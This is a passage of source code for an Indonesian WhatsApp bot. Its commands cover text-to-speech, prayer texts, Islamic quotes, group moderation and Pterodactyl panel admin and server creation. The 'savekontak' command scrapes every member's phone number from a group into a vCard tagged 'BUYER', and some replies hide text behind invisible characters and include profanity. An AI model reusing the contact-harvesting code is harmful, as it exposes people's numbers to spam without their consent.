        const { data } = await axios.get(`https://deddy-tts-rvc-tokoh-indonesia.hf.space/queue/data?session_hash=${session_hash}`)      
        let audioUrl
        const lines = data.split('\n\n')
        for (const line of lines) {
            if (line.startsWith('data:')) {
                const d = JSON.parse(line.substring(6))
                if (d.msg === 'process_completed') audioUrl = d.output.data[2].url
            }
        }
        if (!audioUrl) throw new Error('• Gagal Mendapatkan Audio!')
        await sock.sendMessage(m.chat, { 
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            ptt: true,
            filename: 'ttsindo.mp3'
        }, { quoted: m })

    } catch (error) {
        console.error('Voice Changer Error:', error)
        m.reply(`❌ Gagal Membuat Suara: ${error.message}`)
    }
    break
}
case "niatsholat": case "niatshalat": {
    if (!q) return m.reply(`• Contoh Penggunaan :\nniatsholat Subuh\n\n List :\n• subuh\n• maghrib\n• dzuhur\n• isha\n• ashar`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    m.reply(`
*Niat Sholat ${text}*

• Arab : ${data.arabic}

• Latin : ${data.latin} 

• Translate : ${data.translation_id}`.trim())
}
break
case "quotesislami": case "katakataislam": {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    m.reply(`•${arabic}\n•${arti}`)
}
break
case 'infoch': {
  if (!text) return m.reply('• Contoh Penggunaan : .infoch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v');
  if (!text.includes("https://whatsapp.com/channel/")) {
    return m.reply("• Link Tautan Tidak Valid!");
  }
  try {
    let result = text.split('https://whatsapp.com/channel/')[1];
    let metadata = await sock.newsletterMetadata("invite", result);
    let teks = `• *ID Channel:* ${metadata.id}
• *Nama:* ${metadata.name}
• *Deskripsi:* ${metadata.description}
• *Total Pengikut:* ${metadata.subscribers}
• *Status:* ${metadata.state}
• *Verified:* ${metadata.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`;
    return m.reply(teks);
  } catch (e) {
    console.log(e);
    return m.reply('Gagal mengambil data channel.');
  }
}
break
case "savekontak": {
  if (!isCreator) return m.reply(`• Fitur Khusus Owner!`);
  if (!text) return m.reply("• Contoh Penggunaan : .savekontak 1234xxx@g.us");

  var idnya = text;
  var groupMetadataa;
  let contacts = [];

  try {
    groupMetadataa = await sock.groupMetadata(`${idnya}`);
  } catch (e) {
    return m.reply("• ID Group Tidak Valid!");
  }
  const participants = groupMetadataa.participants;
  const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);

  for (let mem of halls) {
    if (mem !== m.sender) {
      contacts.push(mem);
      fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts));
    }
  }
  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((contact, index) => {
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:BUYER [${createSerial(2)}] ${contact.split("@")[0]}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        ""
      ].join("\n");
    }).join("");
    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
  } catch (err) {
    m.reply(err.toString());
  } finally {
    if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`);
    await sock.sendMessage(m.sender, {
      document: fs.readFileSync("./database/contacts.vcf"),
      fileName: "contacts.vcf",
      caption: "File Contact Berhasil Di Buat✅",
      mimetype: "text/vcard",
    }, { quoted: m });
    contacts = [];
    fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts));
    fs.writeFileSync("./database/contacts.vcf", "");
  }
}
break;
case "kick": case "kik": case "door": {
if (!m.isGroup) return reply(messs.gb)
if (!isCreator && !isAdmins) return reply(mess.adm)
if (!isBotAdmins) return reply(mess.b)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await sock.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("• Nomor Tidak Terdaftar Di WhatsApp!")
const res = await sock.groupParticipantsUpdate(m.chat, [input], 'remove')
await reply(`• Berhasil mengeluarkan ${input.split("@")[0]} Dari Group Ini`)
} else {
return m.reply(example("• Contoh Penggunaan : .kick @tag/reply"))
}
}
break;
//=====( CASE PANEL )=====\\
case "listadmin": {
if (!isCreator) return m.reply(`• Fitur Khusus Owner!`)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("• Tidak Ada Admin Panel")
var teks = "*List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break        
case "deladmin": {
if (!isCreator) return m.reply(`• Fitur Khusus Owner!`)
if (!args[0]) return m.reply("• ID nya Mana?") 
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("• Akun Admin Panel Tidak Ditemukan!")
m.reply("• Success Delete Admin Panel!")
}
break 
case "cadmin": {
if (!isCreator) return m.reply()
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`Contoh Penggunaan :
${prefix+command} user,628xxx`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await sock.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
let password = username + crypto.randomBytes(2).toString('hex')
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@Devil.id",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: USER

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
CREATED AT: ${user.created_at}
`
    const listMessage = {
        text: tks,
    }
    await sock.sendMessage(m.chat, listMessage)
var teks = `*Woi Kontol*
‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
Canda, Ada Paket Admin Panel 📦
* *👤 Username :* ${user.username}
* *🔐 Password :* ${password.toString()}
* *🔗 Link Login :* ${global.domain} 


*Note !!*
> dilarang membagikan panel free
> dilarang menyebarkan data panel
> dilarang menyebarkan link panel
> dilarang membuat akun admin panel
> dilarang run sc yang berbau ddos
> *Data Hanya Di kirim 1x Hilang? Salah Sendiri*
> *Garansi 7hari*

_*Sc Cpanel Free?*_ 
_Ketik: \`.Script\`_
`
sock.sendMessage(global.panel2[1],{text: teks }, { quoted: m })
}

break; 
        case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gbb": case "10gb": {
    if (!prem || !prem2) return reply(mess.prem)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await sock.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
}
let username = global.panel2[0].toLowerCase()
let email = username+"@Devil.id"
let name = username
let password = username + crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Berhasil Membuat Akun Panel ✅*

* *User ID :* ${user.id}
* *Server ID :* ${server.id}
* *Nama :* ${name} Server
* *Ram :* ${ram == "10125" ? "10Gb" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "220" ? "220%" : cpu+"%"}
* *Storage :* ${disknya == "10125" ? "10Gb" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
Data Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
var teks = `*MAMPUSS GW RIPP 😹😹🫵🏻🫵🏻*
‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌